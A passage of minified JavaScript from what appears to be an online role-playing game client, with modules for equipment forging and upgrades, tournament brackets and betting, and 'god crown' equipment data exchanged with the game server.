e.sysId=PackageID.strongthen,e.regNetMsg(2,e.doForgeUpdata),e.regNetMsg(5,e.postMeltItem),observe(e,e.delaySeekItem,o.BagCT.ins().postItemAdd),observe(e,e.delaySeekItem,o.BagCT.ins().postItemDel),observe(e,e.delaySeekItem,o.BagCT.ins().postItemChange),observe(e,e.delaySeekItem,s.ActorCC.postSoulChange),e}return __extends(e,t),Object.defineProperty(e,"CONDITION_ZHUZAO",{get:function(){return a.GlobalConfig.StoneOpenConfig[0].openLv},enumerable:!1,configurable:!0}),e.ins=function(){return t.ins.call(this)},e.prototype.doForgeUpdata=function(t){var e=t.readByte(),i=0;if(e){var n=t.readShort();i=r.SubRoles.ins().getSubRoleByIndex(n).parseForgeChange(t,this.sysId)}this.postForgeUpdate(this.sysId,i,e)},e.prototype.postForgeUpdate=function(t,e,i){return void 0===e&&(e=0),[t,e,i]},e.prototype.postForgeTips=function(t){return t?1:0},e.prototype.sendUpGrade=function(t,e){var i=this.getBytes(2);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},e.prototype.delaySeekItem=function(){Timer.has(this.seekForgeItem,this)||Timer.start(60,1,this.seekForgeItem,this)},e.prototype.seekForgeItem=function(){for(var t=!1,e=o.BagCT.ins().getBagItemNum(0),i=0;e>i;i++){var n=o.BagCT.ins().getBagGoodsByIndex(0,i);switch(n.itemConfig.id){case 200002:t=this.forgeHint(0,n.count);break;case 200003:t=this.forgeHint(l.ForgeWin.Page_Select_ZhuLing,n.count)}if(t)break}t||(t=this.forgeHint(l.ForgeWin.Page_Select_Gem,s.ActorCC.soul)),this.postForgeTips(t)},e.prototype.getForgeConfigByPos=function(t,e,i){var n=this.getForgeConfig(i);return n[t]&&n[t][e]},e.prototype.getForgeConfig=function(t){if(this.forgeConfigDic=this.forgeConfigDic||{},!this.forgeConfigDic[t]){var e=void 0;switch(t){case l.ForgeWin.Page_Select_Boost:e=a.GlobalConfig.EnhanceAttrConfig;break;case l.ForgeWin.Page_Select_ZhuLing:e=a.GlobalConfig.ZhulingAttrConfig;break;case l.ForgeWin.Page_Select_Gem:e=a.GlobalConfig.StoneLevelConfig;break;case 3:}var i=this.forgeConfigDic[t]={};for(var n in e){var o=e[n];i[o.posId]||(i[o.posId]={}),i[o.posId][o.level]=e[n]}}return this.forgeConfigDic[t]},e.prototype.getEnhanceCostConfigByLv=function(t){var e=a.GlobalConfig.EnhanceCostConfig;return e[t]},e.prototype.getStoneLevelCostConfigByLv=function(t){var e,i=a.GlobalConfig.StoneLevelCostConfig;for(e in i){var n=i[e];if(n.level==t)return n}return null},e.prototype.getZhulingCostConfigByLv=function(t){var e,i=a.GlobalConfig.ZhulingCostConfig;for(e in i){var n=i[e];if(n.level==t)return n}return null},e.prototype.jingLianCanUp=function(){for(var t=r.SubRoles.ins().subRolesLen,e=!1,i=0;t>i;i++){var n=r.SubRoles.ins().getSubRoleByIndex(i),s=n.getMinEquipIndexByType(1),a=n.getEquipByIndex(s).zhuling,l=this.getZhulingCostConfigByLv(a+1).count;if(l){var h=this.getZhulingCostConfigByLv(a+1).itemId,u=o.BagCT.ins().getBagGoodsCountById(o.BagCT.BAG_TYPE_OTHTER,h);if(u>=l){e=!0;break}}}return e},e.prototype.forgeHint=function(t,i){for(var n=r.SubRoles.ins().subRolesLen,o=0;n>o;o++){var a=r.SubRoles.ins().getSubRoleByIndex(o),h=a.getMinEquipIndexByType(t),u=this.getForgeLv(t,a,h),p=this.getForgeCount(t,u);if(p&&i>=p){if(t!=l.ForgeWin.Page_Select_Gem)return this.postForgeTips(!0),!0;if(s.ActorCC.level>=e.CONDITION_ZHUZAO)return this.postForgeTips(!0),!0}}return this.postForgeTips(!1),!1},e.prototype.getForgeLv=function(t,e,i){switch(t){case l.ForgeWin.Page_Select_Boost:return e.getEquipByIndex(i).strengthen;case l.ForgeWin.Page_Select_ZhuLing:return e.getEquipByIndex(i).zhuling;case l.ForgeWin.Page_Select_Gem:return e.getEquipByIndex(i).gem;case 3:return e.getEquipByIndex(i).tupo}},e.prototype.getForgeCount=function(t,e){switch(t){case l.ForgeWin.Page_Select_Boost:var i=this.getEnhanceCostConfigByLv(e+1);if(i)return i.stoneNum;break;case l.ForgeWin.Page_Select_ZhuLing:var n=this.getZhulingCostConfigByLv(e+1);if(n)return n.count;break;case l.ForgeWin.Page_Select_Gem:var o=this.getStoneLevelCostConfigByLv(e+1);if(o)return o.soulNum;break;case 3:}return 0},e.prototype.countAllBoostAttr=function(t,i,n,o){void 0===n&&(n=0),void 0===o&&(o=!1);for(var s=[],a=r.SubRoles.ins().getSubRoleByIndex(t),l=0;l<u.EquipCT.FOEGE_MAX;l++){var h=null,p=this.getForgeLv(i,a,l);o&&n==l&&(p+=1),h=this.getForgeConfigByPos(l,p,i),h&&h.attr&&(s=e.AttrAddition(h.attr,s))}return s},e.prototype.isMaxForge=function(t,e){for(var i=0;8>i;i++){var n=this.getForgeLv(e,t,e),o=this.getForgeConfigByPos(e,n+1,e);if(!o)return!1}return!0},e.AttrAddition=function(t,e){for(var i,n=t.length,o=e.length,s=[],a=0;n>a;a++)i=h.AttributeData.copyAttrbute(t[a]),s.push(i);for(var r=0;o>r;r++){for(var l=!1,a=0;a<s.length;a++)e[r].type==s[a].type&&(s[a].value=s[a].value+e[r].value,l=!0);l||(i=h.AttributeData.copyAttrbute(e[r]),s.push(i))}return s},e.prototype.sendMeltItem=function(t){var e=this.getBytes(5);e.writeShort(t.length);for(var i in t)e.writeInt(t[i].configID),e.writeInt(t[i].count);this.sendToServer(e)},e.prototype.postMeltItem=function(){},e.upGradeTime=150,__decorate([post()],e.prototype,"postForgeUpdate",null),__decorate([post()],e.prototype,"postForgeTips",null),__decorate([post()],e.prototype,"postMeltItem",null),e}(n.BaseSystem);e.ForgeCT=p,window.ForgeCT=p,__reflect(p.prototype,"ForgeCT",[]),Systemap.ForgeCT=function(){return p.ins()},window.ForgeCT=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakedHelp=void 0;var n=i(0),o=i(73),s=i(8),a=i(89),r=i(4),l=i(7),h=function(){function t(){}return t.getNextTimerStr=function(){var t=0,e=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.SignUp]+t,s.DateUtils.TIME_FORMAT_13),i=e+gettext("可报名单服晋级赛");return i},t.getNextKfTimerStr=function(){var t=0,e=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Knockout]+t,s.DateUtils.TIME_FORMAT_13),i=e+gettext("可报名跨服巅峰赛季");return i},t.getTimerRuleStr=function(){var t=n.GlobalConfig.PeakRaceBase,e="|C:0x00ff78&T:",i=gettext("1、报名等级：达到{0}{1}|转\n",e,t.needZsLv),o=s.DateUtils.TIME_FORMAT_13,r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.SignUp],o),l=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Knockout],o);return i+=gettext("2、报名时间：{0}{1}|到{2}{3}|\n",e,r,e,l),r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Knockout],o),i+=gettext("3、淘汰赛：{0}{1}|举行，所有报名玩家争夺16强席位\n",e,r),r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Prom16],o),i+=gettext("4、八强赛：{0}{1}|举行\n",e,r),r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Prom8],o),i+=gettext("5、四强赛：{0}{1}|举行\n",e,r),r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Prom4],o),i+=gettext("6、半决赛：{0}{1}|举行\n",e,r),r=s.DateUtils.getFormatBySecond(this.bfStatusTimer[a.BF_PeakStatus.Finals],o),i+=gettext("7、决赛：{0}{1}|举行\n",e,r)},t.getKFTimerRuleStr=function(){var t="|C:0x00ff78&T:",e=gettext("1、报名条件：单服16强自动报名\n"),i=s.DateUtils.TIME_FORMAT_13,n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Knockout],i);return e+=gettext("2、淘汰赛：{0}{1}|举行，决出64强\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Prom64],i),e+=gettext("3、32强赛：{0}{1}|举行\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Prom32],i),e+=gettext("4、16强赛：{0}{1}|举行\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Prom16],i),e+=gettext("4、八强赛：{0}{1}|举行\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Prom8],i),e+=gettext("5、四强赛：{0}{1}|举行\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Prom4],i),e+=gettext("6、半决赛：{0}{1}|举行\n",t,n),n=s.DateUtils.getFormatBySecond(this.kfStatusTimer[a.KF_PeakStatus.Finals],i),e+=gettext("7、决赛：{0}{1}|举行\n",t,n)},t.calcEliminateWinNum=function(){var t=0;if(o.PeakedSys.ins().isKf())for(var e=0,i=o.PeakedSys.ins().kfKonckReportList;e<i.length;e++){var n=i[e];n.result&&t++}else for(var s=0,a=o.PeakedSys.ins().bfKonckReportList;s<a.length;s++){var n=a[s];n.result&&t++}return t},t.getPlayerData=function(t,e){var i=o.PeakedSys.ins();return t==this.PK_GROUP_1?i.player16List[e-1]:t==this.PK_GROUP_2?i.player8List[e-1]?i.player8List[e-1]:this.findLastDt(e,i.player16List):t==this.PK_GROUP_3?i.player4List[e-1]?i.player4List[e-1]:this.findLastDt(e,i.player8List):i.player2Data?i.player2Data:this.findLastDt(e,i.player4List)},t.getKFPlayerData=function(t,e,i,n){void 0===i&&(i=0),void 0===n&&(n=!1);var s=o.PeakedSys.ins();return t==this.PK_GROUP_1?n?s.kfPlayer16List[e-1]?s.kfPlayer16List[e-1]:this.findLastDt(e,s.kfPlayer64List):s.kfPlayer64List.slice(8*i,8*i+8)[e-1]:t==this.PK_GROUP_2?n?s.kfPlayer8List[e-1]?s.kfPlayer8List[e-1]:this.findLastDt(e,s.kfPlayer16List):s.kfPlayer32List.slice(4*i,4*i+4)[e-1]?s.kfPlayer32List.slice(4*i,4*i+4)[e-1]:this.findLastDt(e,s.kfPlayer64List.slice(8*i,8*i+8)):t==this.PK_GROUP_3?n?s.kfPlayer4List[e-1]?s.kfPlayer4List[e-1]:this.findLastDt(e,s.kfPlayer8List):s.kfPlayer16List.slice(2*i,2*i+2)[e-1]?s.kfPlayer16List.slice(2*i,2*i+2)[e-1]:this.findLastDt(e,s.kfPlayer32List.slice(4*i,4*i+4)):s.kfPlayer2Data?s.kfPlayer2Data:this.findLastDt(e,s.kfPlayer4List)},t.findLastDt=function(t,e){if(e&&e[2*(t-1)+1]){var i=e[2*(t-1)>>0].winId,n=e[2*(t-1)+1>>0].winId,o=new a.PeakPlayerData;return o.playerList=[],o.playerList.push(this.findPlayerDtById(i)),o.playerList.push(this.findPlayerDtById(n)),o.reportList=[],o}return null},t.findPlayerDtById=function(t,e){e||(e=o.PeakedSys.ins().isKf()?o.PeakedSys.ins().kfPlayer64List:o.PeakedSys.ins().player16List);for(var i=0,n=e;i<n.length;i++)for(var s=n[i],a=0,r=s.playerList;a<r.length;a++){var l=r[a];if(t==l.roleId)return l}return null},t.checkIsWinById=function(e,i,n){n||(n=o.PeakedSys.ins().isKf()?t.getPlayerListByStage(i):t.getPlayerListByStage(i));for(var s=0,a=n;s<a.length;s++){var r=a[s];if(e==r.winId)return!0}return!1},t.getPlayerListByStage=function(t){if(o.PeakedSys.ins().isKf())switch(t){case a.KF_PeakStatus.Knockout:case a.KF_PeakStatus.Prom64:return o.PeakedSys.ins().kfPlayer64List;case a.KF_PeakStatus.Prom32:return o.PeakedSys.ins().kfPlayer32List;case a.KF_PeakStatus.Prom16:return o.PeakedSys.ins().kfPlayer16List;case a.KF_PeakStatus.Prom8:return o.PeakedSys.ins().kfPlayer8List;case a.KF_PeakStatus.Prom4:return o.PeakedSys.ins().kfPlayer4List;case a.KF_PeakStatus.Finals:return[o.PeakedSys.ins().kfPlayer2Data]}else switch(t){case a.BF_PeakStatus.Prom16:case a.BF_PeakStatus.Knockout:return o.PeakedSys.ins().player16List;case a.BF_PeakStatus.Prom8:return o.PeakedSys.ins().player8List;case a.BF_PeakStatus.Prom4:return o.PeakedSys.ins().player4List;case a.BF_PeakStatus.Finals:return[o.PeakedSys.ins().player2Data]}},t.countMyRecordData=function(){for(var t=o.PeakedSys.ins().player16List,e=o.PeakedSys.ins().player8List,i=o.PeakedSys.ins().player4List,n=o.PeakedSys.ins().player2Data,s=function(t,e,i){for(var n=t.playerList.length,s=0;n>s;s++){var l=t.playerList[s];if(l.roleId==r.ActorCC.actorID){var h=n>1?t.playerList[0==s?1:0].playerName:gettext("轮空");if(0==t.reportList.length&&!t.playerList[1]&&i<o.PeakedSys.ins().bfStatus){var u=new a.PeakBattleReportData;u.stateType=i,u.playerName=h,u.result=1,u.round=0,e.push(u)}else for(var p=0,d=0,c=t.reportList;d<c.length;d++){var f=c[d],u=new a.PeakBattleReportData;u.stateType=i,u.playerName=h,u.result=f==r.ActorCC.actorID?1:0,u.round=++p,e.push(u)}break}}},l=[],h=0,u=t;h<u.length;h++){var p=u[h];s(p,l,a.BF_PeakStatus.Prom16)}for(var d=0,c=e;d<c.length;d++){var p=c[d];s(p,l,a.BF_PeakStatus.Prom8)}for(var f=0,g=i;f<g.length;f++){var p=g[f];s(p,l,a.BF_PeakStatus.Prom4)}return s(n,l,a.BF_PeakStatus.Finals),l},t.countKFMyRecordData=function(){for(var t=o.PeakedSys.ins().kfPlayer64List,e=o.PeakedSys.ins().kfPlayer32List,i=o.PeakedSys.ins().kfPlayer16List,n=o.PeakedSys.ins().kfPlayer8List,s=o.PeakedSys.ins().kfPlayer4List,l=o.PeakedSys.ins().kfPlayer2Data,h=function(t,e,i){for(var n=t.playerList.length,s=0;n>s;s++){var l=t.playerList[s];if(l.roleId==r.ActorCC.actorID){var h=n>1?t.playerList[0==s?1:0].playerName:gettext("轮空");if(0==t.reportList.length&&!t.playerList[1]&&i<o.PeakedSys.ins().kfStatus){var u=new a.PeakBattleReportData;u.stateType=i,u.playerName=h,u.result=1,u.round=0,e.push(u)}else for(var p=0,d=0,c=t.reportList;d<c.length;d++){var f=c[d],u=new a.PeakBattleReportData;u.stateType=i,u.playerName=h,u.result=f==r.ActorCC.actorID?1:0,u.round=++p,e.push(u)}break}}},u=[],p=0,d=t;p<d.length;p++){var c=d[p];h(c,u,a.KF_PeakStatus.Prom64)}for(var f=0,g=e;f<g.length;f++){var c=g[f];h(c,u,a.KF_PeakStatus.Prom32)}for(var m=0,v=i;m<v.length;m++){var c=v[m];h(c,u,a.KF_PeakStatus.Prom16)}for(var y=0,C=n;y<C.length;y++){var c=C[y];h(c,u,a.KF_PeakStatus.Prom8)}for(var T=0,b=s;T<b.length;T++){var c=b[T];h(c,u,a.KF_PeakStatus.Prom4)}return h(l,u,a.KF_PeakStatus.Finals),u},t.findBetInfoById=function(t,e,i){if(!i){var n=o.PeakedSys.ins().isKf();i=n?o.PeakedSys.ins().kfBetInfo:o.PeakedSys.ins().betInfo}if(!i)return null;for(var s=0,a=i;s<a.length;s++){var r=a[s];if(r.playerId==t&&r.status==e)return r}return null},t.getStatusByGroup=function(t){if(o.PeakedSys.ins().isKf())if(o.PeakedSys.ins().isKFSixteen())switch(t){case this.PK_GROUP_1:return a.KF_PeakStatus.Prom16;case this.PK_GROUP_2:return a.KF_PeakStatus.Prom8;case this.PK_GROUP_3:return a.KF_PeakStatus.Prom4;case this.PK_GROUP_4:return a.KF_PeakStatus.Finals}else switch(t){case this.PK_GROUP_1:return a.KF_PeakStatus.Prom64;case this.PK_GROUP_2:return a.KF_PeakStatus.Prom32}else switch(t){case this.PK_GROUP_1:return a.BF_PeakStatus.Prom16;case this.PK_GROUP_2:return a.BF_PeakStatus.Prom8;case this.PK_GROUP_3:return a.BF_PeakStatus.Prom4;case this.PK_GROUP_4:return a.BF_PeakStatus.Finals}},t.checkIsBetByGroup=function(t){var e=(parseInt(t),o.PeakedSys.ins().isKf()),i=e?o.PeakedSys.ins().kfBetInfo:o.PeakedSys.ins().betInfo,n=this.getStatusByGroup(parseInt(t));for(var s in i)if(i[s].status==n)return!0;return!1},t.checkIsBet=function(t,e){for(var i=parseInt(e),n=o.PeakedSys.ins().isKf(),s=0,r=t;s<r.length;s++){var l=r[s];if(l){var h=this.findBetInfoById(l.roleId,this.getStatusByGroup(parseInt(e)));if(h)if(n)if(o.PeakedSys.ins().isKFSixteen()){if(i==this.PK_GROUP_1&&h.status==a.KF_PeakStatus.Prom16)return!0;if(i==this.PK_GROUP_2&&h.status==a.KF_PeakStatus.Prom8)return!0;if(i==this.PK_GROUP_3&&h.status==a.KF_PeakStatus.Prom4)return!0;if(i==this.PK_GROUP_4&&h.status==a.KF_PeakStatus.Finals)return!0}else{if(i==this.PK_GROUP_1&&h.status==a.KF_PeakStatus.Prom64)return!0;if(i==this.PK_GROUP_2&&h.status==a.KF_PeakStatus.Prom32)return!0}else{if(i==this.PK_GROUP_1&&h.status==a.BF_PeakStatus.Prom16)return!0;if(i==this.PK_GROUP_2&&h.status==a.BF_PeakStatus.Prom8)return!0;if(i==this.PK_GROUP_3&&h.status==a.BF_PeakStatus.Prom4)return!0;if(i==this.PK_GROUP_4&&h.status==a.BF_PeakStatus.Finals)return!0}}}return!1},t.findPlayerIndexById=function(t,e){for(var i=0;i<e.length;i++)if(e[i].roleId==t)return i;return-1},t.setImgGroupSource=function(t,e){for(var i=0;i<t.numChildren;i++){var n=t.getChildAt(i);n&&(n.source=e)}},t.statusIsOver=function(t,e){return e?o.PeakedSys.ins().kfStatus>t||o.PeakedSys.ins().kfStatus==t&&0!=o.PeakedSys.ins().kfStatusIsEnd:o.PeakedSys.ins().bfStatus>t||o.PeakedSys.ins().bfStatus==t&&0!=o.PeakedSys.ins().bfStatusIsEnd},t.statusIsOverByGroup=function(e){var i=!1;return o.PeakedSys.ins().isKf()?o.PeakedSys.ins().isKFSixteen()?i=e==this.PK_GROUP_1?t.statusIsOver(a.KF_PeakStatus.Prom16,!1):e==this.PK_GROUP_2?t.statusIsOver(a.KF_PeakStatus.Prom8,!1):e==this.PK_GROUP_3?t.statusIsOver(a.KF_PeakStatus.Prom4,!1):t.statusIsOver(a.KF_PeakStatus.Finals,!1):e==this.PK_GROUP_1?i=t.statusIsOver(a.KF_PeakStatus.Prom64,!1):e==this.PK_GROUP_2&&(i=t.statusIsOver(a.KF_PeakStatus.Prom32,!1)):i=e==this.PK_GROUP_1?t.statusIsOver(a.BF_PeakStatus.Prom16,!1):e==this.PK_GROUP_2?t.statusIsOver(a.BF_PeakStatus.Prom8,!1):e==this.PK_GROUP_3?t.statusIsOver(a.BF_PeakStatus.Prom4,!1):t.statusIsOver(a.BF_PeakStatus.Finals,!1),i},t.pushPlayerList=function(e,i,n,o){var s=n.playerList;if(e[2*o]){var a=t.findPlayerDtById(e[2*o].winId,i);a&&(s.push(a),n.winId==a.roleId&&(n.winPos=0))}if(e[2*o+1]){var a=t.findPlayerDtById(e[2*o+1].winId,i);a&&(s.push(a),n.winId==a.roleId&&(n.winPos=1))}},t.isSixteenById=function(t){for(var e=0,i=o.PeakedSys.ins().player16List;e<i.length;e++){var n=i[e];if(n)for(var s=0,a=n.playerList;s<a.length;s++){var r=a[s];if(r.roleId==t)return!0}}return!1},t.sortBetFun=function(t,e){return t.status>e.status?1:t.status<e.status?-1:0},t.findKFGroupById=function(t){for(var e=0,i=0,n=o.PeakedSys.ins().kfPlayer64List;i<n.length;i++){for(var s=n[i],a=0,r=s.playerList;a<r.length;a++){var l=r[a];if(l.roleId==t)return e/8>>0}e++}return-1},t.findBetKFGroup=function(){for(var t=o.PeakedSys.ins().kfStatus,e=0,i=o.PeakedSys.ins().kfBetInfo;e<i.length;e++){var n=i[e];if(n.status==a.KF_PeakStatus.Prom64&&t==a.KF_PeakStatus.Knockout||n.status==a.KF_PeakStatus.Prom32&&t==a.KF_PeakStatus.Prom64)return this.findKFGroupById(n.playerId)}return-1},t.canSupport=function(){var t=this.kfStatusTimer[a.KF_PeakStatus.None]+s.DateUtils.DAYS_PER_WEEK*s.DateUtils.SECOND_PER_DAY;
return l.GameServerCC.serverTime/s.DateUtils.MS_PER_SECOND>t&&o.PeakedSys.ins().kfStatus>=a.KF_PeakStatus.Finals&&o.PeakedSys.ins().kfStatusIsEnd?!1:!0},t.PK_GROUP_1=1,t.PK_GROUP_2=2,t.PK_GROUP_3=3,t.PK_GROUP_4=4,t.bfStatusTimer=[],t.kfStatusTimer=[],t}();e.PeakedHelp=h,window.PeakedHelp=h,__reflect(h.prototype,"PeakedHelp",[]),window.PeakedHelp=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodCrownCT=void 0;var n=i(19),o=i(22),s=i(72),a=i(34),r=i(14),l=i(37),h=i(17),u=i(0),p=i(4),d=i(13),c=i(6),f=function(t){function e(){var e=t.call(this)||this;return e.outDrawValue=0,e.GodCrownDadaList=[],e.nowOpenEquipCount=0,e.nowOpenId=1,e.crownEquip=null,e.nowOpenEquipPartsCount=0,e.nowSelectPartId=1,e.crownEquipPart=null,e.atrrValueArr=[{type:141,value:0},{type:142,value:0}],e.atrrValueArr0=[{type:5,value:0},{type:6,value:0}],e.hasActCount=0,e.nowShowSkillQ=[],e.nowShowAttrQ=[],e.sysId=PackageID.Weapons,e.regNetMsg(30,e.postInfo),e.regNetMsg(32,e.postCrownDate),e.regNetMsg(33,e.postCrownUpDate),e.regNetMsg(34,e.postCrownPartUpDate),e.regNetMsg(35,e.postUseCrown),e.initRed(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRed=function(){this.AllBagRed=new h.RedPoint(this.returnRedP,c.BagCT.ins().postItemChange,this.updateGodCrownInitData,this.postCrownPartUpDateObserve,this.postCrownDateObserve,this.postCrownUpDateObserve)},e.prototype.returnRedP=function(){var t=u.GlobalConfig.CrownCfg;if(t)for(var i in t){var n=e.ins().returnCownRed(i);if(n)return!0}return!1},e.prototype.postInfo=function(t){this.outDrawValue=t.readByte();var e=t.readByte();this.GodCrownDadaList=[];for(var i=0;e>i;i++){for(var n=t.readByte(),o=t.readByte(),s=[],a=0;o>a;a++){for(var r=t.readByte(),l=t.readByte(),h=t.readByte(),u=[],p=0;h>p;p++){var d=t.readByte(),c=t.readByte();u.push({partId:d,partLv:c})}s.push({eqId:r,eqQuilty:l,partCount:h,arr1:u})}this.GodCrownDadaList.push({crownId:n,eqCount:e,eqQuilty:1,arr0:s})}this.updateGodCrownInitData()},e.prototype.updateGodCrownInitData=function(){},e.prototype.postOneEquipData=function(t){var e=t.readByte(),i=(t.readByte(),t.readByte()),n=this.returnVBCrowId(e);n.eqQuilty=i},e.prototype.sendCrown=function(t){var e=this.getBytes(32);e.writeByte(t),this.sendToServer(e)},e.prototype.postCrownDate=function(t){var e=t.readByte();this.GodCrownDadaList.push({crownId:e,eqCount:0,eqQuilty:1,arr0:[]}),this.postCrownDateObserve()},e.prototype.postCrownDateObserve=function(){},e.prototype.sendCrownUp=function(t,e){var i=this.getBytes(33);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postCrownUpDate=function(t){var e=t.readByte(),i=t.readByte(),n=t.readByte(),o=this.returnVBCrowId(e),s=this.returnEquipData({crownId:e,equipId:i});s?s.eqQuilty=n:(o.arr0.push({eqId:i,eqQuilty:n,partCount:0,arr1:[]}),o.eqCount++),this.postCrownUpDateObserve()},e.prototype.postCrownUpDateObserve=function(){},e.prototype.sendCrownPartUp=function(t,e,i){var n=this.getBytes(34);n.writeByte(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.postCrownPartUpDate=function(t){var e=t.readByte(),i=t.readByte(),n=t.readByte(),o=t.readByte(),s=this.returnEquipData({crownId:e,equipId:i}),a=this.returnPart({crownId:e,equipId:i,partId:n});a?a.partLv=o:(s.arr1.push({partId:n,partLv:o}),s.partCount++),this.postCrownPartUpDateObserve()},e.prototype.postCrownPartUpDateObserve=function(){},e.prototype.sendUseCrown=function(t){var e=this.getBytes(35);e.writeByte(t),this.sendToServer(e)},e.prototype.postUseCrown=function(t){var e=t.readDouble(),i=t.readByte(),n=l.EntityManager.ins().getEntityByHandle(e);n&&n.data&&n.data.type==EntityType.Role&&n.infoModel&&(n.data.isMy&&(this.outDrawValue=d.SubRoles.ins().getSubRoleByIndex(0).godCrownID=i||0),n.infoModel.godCrownID=i||0),this.postUseCrownObserve(),p.ActorCC.postUpdateGodCrown()},e.prototype.postUseCrownObserve=function(){},e.prototype.judgeIsCan=function(t){for(var e=!0,i=0;i<t.length;i++)n.GlobalFun.checkCost(t[i].count,t[i].id,"",!1,null,!1)||(e=!1);return e},e.prototype.returnPart=function(t){var e=this.returnEquipData(t);if(e&&e.partCount>0){var i=e.arr1;if(0!=i.length)for(var n in i)if(i[n].partId==t.partId)return i[n]}return null},e.prototype.returnEquipData=function(t){var e=this.returnVBCrowId(t.crownId);if(e){var i=e.arr0;if(0!=i.length)for(var n in i)if(i[n].eqId==t.equipId)return i[n]}return null},e.prototype.returnVBCrowId=function(t){for(var e in this.GodCrownDadaList)if(this.GodCrownDadaList[e].crownId==t)return this.GodCrownDadaList[e];return null},e.prototype.updateCrownEquip=function(){},e.prototype.updateCrownEquipPart=function(){},e.prototype.returnCrownAttr=function(t){var e=[],i=this.returnVBCrowId(t);if(i&&i.eqCount>0){var n=i.arr0,o=u.GlobalConfig.CrownEquipCfg,s=u.GlobalConfig.CrownPartCfg;for(var a in n){var r=o[t][n[a].eqId][n[a].eqQuilty];if(r){var l=r.attr;for(var h in l)e.push(l[h])}var p=n[a].arr1;for(var d in p){var c=s[t][n[a].eqId][p[d].partId][p[d].partLv];if(c){var f=c.attr;for(var g in f)e.push(f[g])}}}}return e},e.prototype.returnQulAttr=function(){var t=e.ins().crownEquip,i=this.returnEquipData(t),n=[];if(i){var o=u.GlobalConfig.CrownEquipCfg,s=o[t.crownId][t.equipId][i.eqQuilty];if(s){var a=s.attr;for(var r in a)n.push(a[r])}}return n},e.prototype.returnEquipAttr=function(){var t=e.ins().crownEquip,i=[],n=this.returnVBCrowId(t.crownId);if(n&&n.eqCount>0){var o=n.arr0,s=u.GlobalConfig.CrownPartCfg;for(var a in o)if(o[a].eqId==t.equipId&&o[a].partCount>0)for(var r=o[a].arr1,l=0;l<o[a].partCount;l++){var h=s[t.crownId][o[a].eqId][r[l].partId][r[l].partLv];if(h){var p=h.attr;for(var d in p)i.push(p[d])}}}return i},e.prototype.returnArrs=function(t){var e=[];for(var i in t){var n=!1;for(var o in e)e[o].type==t[i].type&&(n=!0,e[o].value+=t[i].value);n||e.push({type:t[i].type,value:t[i].value})}return e},e.prototype.returnAttStr=function(t,e){void 0===e&&(e=null);var i=s.AttributeFormat.FORMAT_1();i.wordColor=null,i.attrColor=null;for(var n in t)if((t[n].type==a.AttributeType.atAtkMin||t[n].type==a.AttributeType.atAtkMax||t[n].type==a.AttributeType.atAtkTaoistMin||t[n].type==a.AttributeType.atAtkTaoistMax||t[n].type==a.AttributeType.atAtkMageMin||t[n].type==a.AttributeType.atAtkMageMax||t[n].type==a.AttributeType.atRes||t[n].type==a.AttributeType.atDef)&&(i.nameType=e,t[n].type==a.AttributeType.atAtkMin||t[n].type==a.AttributeType.atAtkMax))switch(p.ActorCC.jobId){case 2:t[n].type+=4;break;case 3:t[n].type+=2}return o.AttributeData.getAttStr1(t,i)},e.prototype.returnCownRed=function(t){var i=u.GlobalConfig.CrownEquipCfg[t];if(i){var n=this.returnVBCrowId(t);if(n)for(var o in i){var s=this.returnEquipRed(t,o);if(s)return!0}else{var a=u.GlobalConfig.CrownCfg[t];if(a&&e.ins().judgeIsCan(a.cost))return!0}}return!1},e.prototype.returnEquipRed=function(t,e){var i=u.GlobalConfig.CrownEquipCfg[t][e],n=this.returnEquipData({crownId:t,equipId:e});if(n){var o=this.returnEqupQualityRed(t,e,n.eqQuilty);if(o)return!0}else if(i)for(var s in i){var o=this.returnEqupQualityRed(t,e,0);if(o)return!0}if(n){var a=u.GlobalConfig.CrownPartCfg[t][e];if(a)for(var r in a){var l=this.returnPart({crownId:t,equipId:e,partId:r});if(l){var h=this.returnEquipPartRed(t,e,r,l.partLv);if(h)return!0}else if(n.eqQuilty>=+r){var p=a[r];if(p)for(var d in p){var h=this.returnEquipPartRed(t,e,r,0);if(h)return!0}}}}return!1},e.prototype.returnEqupQualityRed=function(t,i,n){var o=u.GlobalConfig.CrownEquipCfg[t][i][+n+1];return o&&e.ins().judgeIsCan(o.cost)?!0:!1},e.prototype.returnEquipPartRed=function(t,i,n,o){var s=u.GlobalConfig.CrownPartCfg[t][i][n][+o+1];return s&&e.ins().judgeIsCan(s.cost)?!0:!1},e.prototype.returnEquipBtnQualityRed=function(){var t=e.ins().crownEquip,i=this.returnEquipData({crownId:t.crownId,equipId:t.equipId});if(i){var n=this.returnEqupQualityRed(t.crownId,t.equipId,i.eqQuilty);if(n)return!0}else{var n=this.returnEqupQualityRed(t.crownId,t.equipId,0);if(n)return!0}return!1},e.prototype.returnEquipPartBtnRed=function(){var t=e.ins().crownEquip,i=this.returnEquipData({crownId:t.crownId,equipId:t.equipId});if(i){var n=u.GlobalConfig.CrownPartCfg[t.crownId][t.equipId];if(n)for(var o in n){var s=this.returnPart({crownId:t.crownId,equipId:t.equipId,partId:o});if(s){var 